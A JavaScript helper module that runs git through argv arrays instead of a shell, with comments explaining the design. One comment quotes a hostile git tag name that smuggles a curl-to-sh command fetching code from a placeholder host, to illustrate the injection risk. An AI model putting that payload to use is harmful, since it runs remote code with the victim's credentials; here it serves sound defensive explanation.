/**
 * git.mjs — the one way this repo's scripts talk to git.
 *
 * ## Why this file exists
 *
 * Every gate and tool that needs git (audit-rilis's date arithmetic aside,
 * which needs none) asks it the same handful of questions — "what does this
 * ref point at", "what changed", "is this even a repo" — and every caller
 * wants the same three behaviours: no shell, a `null` rather than a thrown
 * stack trace when the answer is merely absent (not a repo, git not on
 * PATH), and a distinct escape hatch for the one caller (the release script)
 * that must NOT treat a git failure as silence. One module for all three
 * means a caller cannot reach for `execSync` out of convenience and quietly
 * reopen the injection hole the next section describes.
 *
 * ## Injection: why every argument travels as an argv element
 *
 * This module is adapted from `ahliweb/media-lenterakalteng`'s
 * `packages/gerbang/lib/git.mjs`, and its no-shell design is adopted here
 * from the outset rather than rediscovered the hard way. That repo's release
 * script originally used `execSync` with git's own output spliced into the
 * command string — and `execSync` runs its argument through `/bin/sh`. A git
 * tag may contain `$`, a backtick, `;`, `&` and `|` (`git check-ref-format`
 * rejects only a space and a handful of others), so a tag named
 *
 *     v9.9.9$(curl -s https://evil.test/x | sh)
 *
 * would execute on the machine of whoever ran the release, with their SSH
 * agent and their tokens, and git would fail with a message indistinguishable
 * from an ordinary one.
 *
 * Spawning an argv array removes the shell, so a hostile ref name is passed to
 * git as one literal argument and nothing expands it. This is a property of
 * the call shape rather than of any validation, which is why this module
 * exposes no "run this command string" form at all: an escaping helper is a
 * thing callers forget, and a missing shell is not.
 *
 * ## What is deliberately NOT here
 *
 *   - **No shell form, not even opt-in.** The moment one exists it is used.
 *   - **No argument sanitising.** It would imply the shell is still there. A
 *     value that must not be read as an option belongs after `--`, which is
 *     git's own mechanism and is the caller's decision to make.
 *   - **No caching.** Two gates asking git the same question in one CI run
 *     costs microseconds against a correctness question nobody wants to
 *     answer twice ("is this answer from before or after the checkout?").
 */

/**
 * Run git in `root` and return its stdout, or `null` when git could not answer.
 *
 * `null` is returned for **every** failure — not a git repo, git not
 * installed, a bad revision — because every caller here does the same thing
 * with it: report SKIPPED and say why. A caller that needs to tell those
 * apart wants {@link gitRunOrThrow}, whose error carries git's own stderr.
 *
 * @param {string} root - directory to run in (`git -C`)
 * @param {...string} args - argv elements, never a command string
 * @returns {string | null} stdout, or null when git exited non-zero or failed
 *   to spawn
 */
export function gitRun(root, ...args) {
  let result;
  try {
    result = Bun.spawnSync(["git", "-C", root, ...args], {
      stderr: "pipe",
      stdout: "pipe"
    });
  } catch {
    // git absent from PATH. Indistinguishable from "not a repo" to every
    // caller here, and deliberately so — both mean "this gate cannot run".
    return null;
  }

  if (result.exitCode !== 0) return null;
  return result.stdout.toString();
}

/**
 * As {@link gitRun}, but throws when git fails.
 *
 * For the release script, where a git failure must stop the run rather than
 * be absorbed: a release that silently treats "cannot read the last tag" as
 * "there is no last tag" would tag on top of itself.
 *
 * @param {string} root
 * @param {...string} args
 * @returns {string} stdout
 * @throws {Error} carrying git's stderr, so the message names the real cause
 */
export function gitRunOrThrow(root, ...args) {
  const result = Bun.spawnSync(["git", "-C", root, ...args], {
    stderr: "pipe",
    stdout: "pipe"
  });

  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim();
    throw new Error(
      `git ${args.join(" ")} failed (exit ${result.exitCode})${stderr ? `: ${stderr}` : ""}`
    );
  }

  return result.stdout.toString();
}

/**
 * Run git with its output going straight to the terminal, throwing on failure.
 *
 * For the release script's mutating commands, where the operator is watching
 * and git's own progress output is the feedback. Capturing it would hide
 * exactly the part a human is there to read.
 *
 * @param {string} root
 * @param {...string} args
 * @returns {void}
 * @throws {Error} when git exits non-zero
 */
export function gitRunInherit(root, ...args) {
  const result = Bun.spawnSync(["git", "-C", root, ...args], {
    stderr: "inherit",
    stdout: "inherit"
  });

  if (result.exitCode !== 0) {
    throw new Error(`git ${args.join(" ")} failed (exit ${result.exitCode})`);
  }
}

/**
 * Lines of `git` output, empties dropped.
 *
 * Every caller that asks git for a list wants exactly this, including the
 * trailing newline every git list command emits, which would otherwise turn
 * into one empty entry that has to be filtered somewhere further down.
 *
 * @param {string | null} output - as returned by {@link gitRun}
 * @returns {string[]} empty when `output` is null
 */
export function gitLines(output) {
  if (output === null) return [];
  return output.split("\n").filter(Boolean);
}
